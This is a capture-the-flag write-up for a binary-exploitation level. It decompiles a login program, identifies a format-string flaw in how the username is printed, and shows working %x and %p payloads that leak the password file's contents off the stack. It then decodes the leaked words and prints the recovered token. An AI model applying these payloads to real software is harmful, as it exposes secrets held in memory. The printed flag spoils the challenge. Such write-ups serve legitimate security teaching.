# LEVEL 02

## Code analysis

### Decompiled code (Ghidra)

```c
undefined8 main(void)
{
  int iVar1;
  size_t sVar2;
  long lVar3;
  char *pcVar4;
  char local_118[112];  /* password input buffer */
  char local_a8[48];    /* buffer for password read from file */
  char local_78[100];   /* username buffer */
  int local_14;
  FILE *local_10;

  /* ... zero-initialize buffers ... */

  /* Open and read the password file */
  local_10 = fopen("/home/users/level03/.pass", "r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
    exit(1);
  }

  /* Read 41 bytes (0x29) from the file */
  sVar2 = fread(local_a8, 1, 0x29, local_10);
  local_14 = (int)sVar2;
  sVar2 = strcspn(local_a8, "\n");
  local_a8[sVar2] = '\0';

  if (local_14 != 0x29) {
    fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
    exit(1);
  }
  fclose(local_10);

  /* Login interface */
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");

  /* Read username */
  printf("--[ Username: ");
  fgets(local_78, 100, stdin);
  sVar2 = strcspn(local_78, "\n");
  local_78[sVar2] = '\0';

  /* Read password */
  printf("--[ Password: ");
  fgets(local_118, 100, stdin);
  sVar2 = strcspn(local_118, "\n");
  local_118[sVar2] = '\0';

  puts("*****************************************");

  /* Password check */
  iVar1 = strncmp(local_a8, local_118, 0x29);
  if (iVar1 == 0) {
    printf("Greetings, %s!\n", local_78);
    system("/bin/sh");
    return 0;
  }

  /* VULNERABILITY: Format string */
  printf(local_78);  /* should be printf("%s", local_78) */
  puts(" does not have access!");
  exit(1);
}
```

---

## Vulnerability identification

### Format string vulnerability

Critical line:

```c
printf(local_78);
```

It should have been:

```c
printf("%s", local_78);
```

Consequence: by supplying format specifiers (`%x`, `%p`, `%s`, `%n`) in the username, an attacker can:

- read stack memory;
- access variables stored on the stack;
- or write to memory (with `%n`).

---

## Exploitation

### Step 1 — probing the stack with `%x`

Initial test:

```bash
Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Password: test
```

Example output (truncated):

```
AAAA ffffe500 0 78 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 78252078 25207825 20782520
78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520
252078 0 34376848 61733951 574e6758 6e475873 664b394d feff00 41414141 ...
```

### Step 2 — analyze the values

Positionally you can see several words that correspond to the password bytes.

For example (positions shown in the original notes):

- 22: `34376848` — start of the password
- 23: `61733951`
- 24: `574e6758`
- 25: `6e475873`
- 26: `664b394d`
- 27: `feff00` — string terminator

Observation: the password read from `.pass` is stored on the stack and is therefore leakable via the format-string vulnerability.

### Step 3 — use `%p` on 64-bit systems

Problem: on 64-bit systems `%x` prints 4 bytes (32-bit) while stack values are 8-byte pointers. Use `%p` to read 8 bytes at a time.

Example command:

```bash
echo "%22\$p %23\$p %24\$p %25\$p %26\$p" | ./level02
```

Example output:

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

And without the `0x`/leading formatting (clean hex):

```
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
```

---

## Decoding the password

You can decode the leaked values using a hex-to-bytes conversion, then swap endianness per 8-byte word.

Using CyberChef (example):

1. Input:

   756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d

2. Operation 1: "From Hex" (delimiter: Space)
3. Operation 2: "Swap endianness" (Word length: 8)
4. Result: the password string.

---

## Solution

Token found:`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
